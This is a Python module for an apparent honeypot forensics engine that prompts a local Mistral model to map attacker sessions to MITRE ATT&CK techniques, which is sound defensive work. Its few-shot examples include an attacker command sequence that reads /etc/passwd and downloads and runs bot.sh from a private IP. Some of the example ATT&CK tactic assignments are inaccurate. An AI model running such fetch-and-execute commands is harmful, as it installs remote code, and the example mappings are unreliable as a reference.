"""
ForenHive Forensic Engine — MITRE ATT&CK Mapper via Ollama / Mistral 7B
Maps honeypot session data to MITRE ATT&CK tactics/techniques and Cyber Kill Chain phase.
Runs fully offline — no external API key needed.
"""

import json
import logging
import re
import requests

import config

log = logging.getLogger("ollama_mitre")

_CHAT_URL = f"{config.OLLAMA_URL}/api/chat"

# ── Prompt (example-based — Mistral 7B ignores abstract rules) ─────────────────

_SYSTEM = (
    "You are a cybersecurity analyst specializing in the MITRE ATT&CK framework. "
    "Given honeypot session data, output a JSON object with the ATT&CK mapping. "
    "Respond with valid JSON only — no markdown, no explanation, no extra text."
)

_FEW_SHOTS = [
    # ── Example 1: SSH brute-force + Mirai botnet ──────────────────────────────
    {
        "role": "user",
        "content": json.dumps({
            "honeypot": "cowrie (SSH)",
            "destination_port": 22,
            "login_attempts": 342,
            "commands": [
                "whoami", "uname -a", "cat /etc/passwd",
                "wget http://192.168.1.10/bot.sh",
                "chmod +x bot.sh", "./bot.sh"
            ],
            "yara_matches": ["Mirai_Botnet"],
            "exfil_bytes": 0,
        })
    },
    {
        "role": "assistant",
        "content": json.dumps({
            "tactics": [
                "TA0006 - Credential Access",
                "TA0002 - Execution",
                "TA0011 - Command and Control"
            ],
            "techniques": [
                {"id": "T1110.001", "name": "Brute Force: Password Guessing",                   "tactic": "TA0006"},
                {"id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell",    "tactic": "TA0002"},
                {"id": "T1105",     "name": "Ingress Tool Transfer",                            "tactic": "TA0011"},
                {"id": "T1496",     "name": "Resource Hijacking",                               "tactic": "TA0040"}
            ],
            "kill_chain_phase": "Installation",
            "summary": (
                "Attacker brute-forced SSH credentials (342 attempts), then used a Unix shell "
                "to download and execute a Mirai botnet payload, establishing C2 persistence."
            )
        })
    },
    # ── Example 2: Light port scan / reconnaissance ────────────────────────────
    {
        "role": "user",
        "content": json.dumps({
            "honeypot": "cowrie (SSH)",
            "destination_port": 22,
            "login_attempts": 4,
            "commands": [],
            "yara_matches": [],
            "exfil_bytes": 0,
        })
    },
    {
        "role": "assistant",
        "content": json.dumps({
            "tactics": [
                "TA0043 - Reconnaissance",
                "TA0001 - Initial Access"
            ],
            "techniques": [
                {"id": "T1595.002", "name": "Active Scanning: Vulnerability Scanning", "tactic": "TA0043"},
                {"id": "T1110",     "name": "Brute Force",                              "tactic": "TA0001"}
            ],
            "kill_chain_phase": "Reconnaissance",
            "summary": (
                "Attacker performed limited SSH probing with only 4 login attempts, "
                "consistent with automated scanner testing for default credentials."
            )
        })
    },
    # ── Example 3: SMB / WannaCry ──────────────────────────────────────────────
    {
        "role": "user",
        "content": json.dumps({
            "honeypot": "dionaea (SMB)",
            "destination_port": 445,
            "login_attempts": 1,
            "commands": [],
            "yara_matches": ["WannaCry_Ransomware", "CryptoMiner_XMRig"],
            "exfil_bytes": 84120,
        })
    },
    {
        "role": "assistant",
        "content": json.dumps({
            "tactics": [
                "TA0001 - Initial Access",
                "TA0040 - Impact",
                "TA0010 - Exfiltration"
            ],
            "techniques": [
                {"id": "T1190",     "name": "Exploit Public-Facing Application",        "tactic": "TA0001"},
                {"id": "T1210",     "name": "Exploitation of Remote Services",           "tactic": "TA0008"},
                {"id": "T1486",     "name": "Data Encrypted for Impact",                 "tactic": "TA0040"},
                {"id": "T1496",     "name": "Resource Hijacking (XMRig miner)",          "tactic": "TA0040"}
            ],
            "kill_chain_phase": "Actions on Objectives",
            "summary": (
                "Attacker exploited SMB (EternalBlue/MS17-010) to deliver WannaCry ransomware "
                "and an XMRig crypto-miner. Data exfiltration of ~82 KB detected."
            )
        })
    },
]

# Cyber Kill Chain ordered phases (for validation / fallback ranking)
_KILL_CHAIN_PHASES = [
    "Reconnaissance",
    "Weaponization",
    "Delivery",
    "Exploitation",
    "Installation",
    "Command and Control",
    "Actions on Objectives",
]


class OllamaMitreMapper:

    def __init__(self):
        self._available = None   # lazily checked

    def _check_available(self) -> bool:
        if self._available is not None:
            return self._available
        try:
            r = requests.get(f"{config.OLLAMA_URL}/api/tags", timeout=5)
            models = [m["name"].split(":")[0] for m in r.json().get("models", [])]
            self._available = config.OLLAMA_MODEL in models
            if not self._available:
                log.warning(
                    f"Ollama model '{config.OLLAMA_MODEL}' not loaded "
                    f"(available: {models or 'none'})"
                )
        except Exception as e:
            log.warning(f"Ollama not reachable at {config.OLLAMA_URL}: {e}")
            self._available = False
        return self._available

    def map_session(self, session: dict, commands: list[str] | None = None) -> dict | None:
        """
        Map a session to MITRE ATT&CK tactics/techniques + Kill Chain phase.

        Args:
            session:  dict with keys: honeypot_type, destination_port,
                      login_attempts, yara_matches, exfil_bytes
            commands: list of shell commands observed (from ES cowrie.command events)

        Returns:
            dict with keys: tactics, techniques, kill_chain_phase, summary
            or None if Ollama is unavailable / response unparseable.
        """
        if not self._check_available():
            return None

        honeypot_label = _honeypot_label(session)
        payload_input = {
            "honeypot":        honeypot_label,
            "destination_port": session.get("destination_port", 0),
            "login_attempts":  session.get("login_attempts", 0),
            "commands":        (commands or [])[:30],   # cap at 30 to keep prompt short
            "yara_matches":    session.get("yara_matches", []),
            "exfil_bytes":     session.get("exfil_bytes", 0),
        }

        messages = _FEW_SHOTS + [
            {"role": "user", "content": json.dumps(payload_input)}
        ]

        try:
            resp = requests.post(
                _CHAT_URL,
                json={
                    "model":  config.OLLAMA_MODEL,
                    "messages": [{"role": "system", "content": _SYSTEM}] + messages,
                    "stream": False,
                    "options": {"temperature": 0.1, "num_predict": 512},
                },
                timeout=120,
            )
            resp.raise_for_status()
        except requests.Timeout:
            log.warning("Ollama request timed out (120s) — skipping MITRE mapping")
            return None
        except Exception as e:
            log.warning(f"Ollama request failed: {e}")
            return None

        raw = resp.json().get("message", {}).get("content", "")
        result = _parse_json(raw)
        if result is None:
            log.warning(f"Could not parse Ollama response as JSON: {raw[:200]!r}")
            return None

        result = _validate(result)
        log.info(
            f"MITRE [{session.get('session_id', '')[:12]}...] "
            f"phase={result.get('kill_chain_phase')} "
            f"tactics={len(result.get('tactics', []))} "
            f"techniques={len(result.get('techniques', []))}"
        )
        return result


# ── Helpers ───────────────────────────────────────────────────────────────────

def _honeypot_label(session: dict) -> str:
    htype = session.get("honeypot_type", "unknown")
    port  = session.get("destination_port", 0)
    labels = {
        "cowrie":  f"cowrie (SSH/Telnet)",
        "dionaea": f"dionaea (port {port})",
        "galah":   f"galah (HTTP)",
        "zeek":    f"zeek (network sensor)",
    }
    return labels.get(htype, htype)


def _parse_json(text: str) -> dict | None:
    """Extract JSON from LLM response, handling markdown code fences."""
    text = text.strip()
    # Strip ```json ... ``` or ``` ... ```
    text = re.sub(r"^```(?:json)?\s*", "", text)
    text = re.sub(r"\s*```$", "", text)
    try:
        obj = json.loads(text)
        if isinstance(obj, dict):
            return obj
    except json.JSONDecodeError:
        # Try to find first { ... } block
        m = re.search(r"\{.*\}", text, re.DOTALL)
        if m:
            try:
                return json.loads(m.group())
            except json.JSONDecodeError:
                pass
    return None


def _validate(result: dict) -> dict:
    """Ensure required keys exist and values are sane types."""
    if not isinstance(result.get("tactics"), list):
        result["tactics"] = []
    if not isinstance(result.get("techniques"), list):
        result["techniques"] = []
    if result.get("kill_chain_phase") not in _KILL_CHAIN_PHASES:
        result["kill_chain_phase"] = "Reconnaissance"
    if not isinstance(result.get("summary"), str):
        result["summary"] = ""
    return result
